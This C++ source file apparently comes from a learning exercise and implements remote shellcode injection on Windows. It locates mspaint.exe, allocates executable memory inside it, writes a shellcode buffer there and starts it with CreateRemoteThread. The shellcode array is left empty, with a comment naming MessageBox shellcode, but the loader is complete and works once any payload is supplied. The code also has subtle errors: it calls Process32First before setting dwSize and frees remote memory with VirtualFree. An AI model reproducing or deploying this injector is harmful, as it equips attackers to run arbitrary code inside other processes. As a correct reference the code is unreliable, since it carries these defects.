#include<iostream>
#include<windows.h>
#include<tlhelp32.h>

using namespace std;

int main(int argc, char** argv){
    // Define MessageBox shellcode (x64)
    unsigned char shellcode[] = "";

    // Allocate memory using VirtualAlloc
    // https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc

    // Init PROCESSENTRY32 struct
    PROCESSENTRY32 pe32;


    // Take a snapshot of all running processes
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE){
        char errorMsg[256];
        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), 0, errorMsg, sizeof(errorMsg), NULL);
        cout << "Failed to take snapshot: " << errorMsg << endl;
        return 1;
    }
    
    // Get the first process info in the snapshot
    Process32First(snapshot, &pe32);
    // Set the size member to the whole size of the struct
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Get the first process info in the snapshot
    if (!Process32First(snapshot, &pe32))
    {
        char errorMsg[256];
        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), 0, errorMsg, sizeof(errorMsg), NULL);
        cout << "Failed to get first process: " << errorMsg << endl;
        CloseHandle(snapshot);
        return 1;
    }
    

    // Loop through the whole snapshot until "mspaint.exe" is found
    do {
        // Check if we have a match for 'mspaint.exe'
        if (strcmp(pe32.szExeFile, "mspaint.exe") == 0) {
            // Obtain a handle to 'mspaint.exe'
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            if (hProcess == NULL){
                char errorMsg[256];
                FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), 0, errorMsg, sizeof(errorMsg), NULL);
                cout << "Failed to open process: " << errorMsg << endl;
                return 1;
            }
            // Allocate memory in 'mspaint.exe'
            LPVOID allocated_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            if (allocated_mem == NULL){
                char errorMsg[256];
                FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), 0, errorMsg, sizeof(errorMsg), NULL);
                cout << "Memory allocation failed: " << errorMsg << endl;
                return 1;
            }

            cout << "Memory page allocate at: " << allocated_mem << endl;

            // Write shellcode to the allocated memory in 'mspaint.exe'
            SIZE_T written;
            if(!WriteProcessMemory(hProcess, allocated_mem, shellcode, sizeof(shellcode), &written) || written != sizeof(shellcode)){
                char errorMsg[256];
                FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), 0, errorMsg, sizeof(errorMsg), NULL);
                cout << "Failed to write memory: " << errorMsg << endl;
                VirtualFreeEx(hProcess, allocated_mem, 0, MEM_RELEASE);
                CloseHandle(hProcess);
                CloseHandle(snapshot);
                return 1;
            }
            
            // Create a thread to execute shellcode
            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);

            if (hThread == NULL)
            {   
                char errorMsg[256];
                FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), 0, errorMsg, sizeof(errorMsg), NULL);
                cout << "Failed to obtain handle to process: " << errorMsg << endl;
                VirtualFreeEx(hProcess, allocated_mem, 0, MEM_RELEASE);
                CloseHandle(hProcess);
                CloseHandle(snapshot);
                return 1;
            }

            // Halt execution until created thread returns
            WaitForSingleObject(hThread, INFINITE);

            // Close Handle to Thread
            CloseHandle(hThread);

            // Free allocated memory 
            VirtualFree(allocated_mem, 0, MEM_RELEASE);
            
            // Close handle to the process
            CloseHandle(hProcess);

            break;
        }
        // Enumerate the snapshot
    } while(Process32Next(snapshot, &pe32));

    // Close the snapshot handle
    CloseHandle(snapshot);

    return 0;
}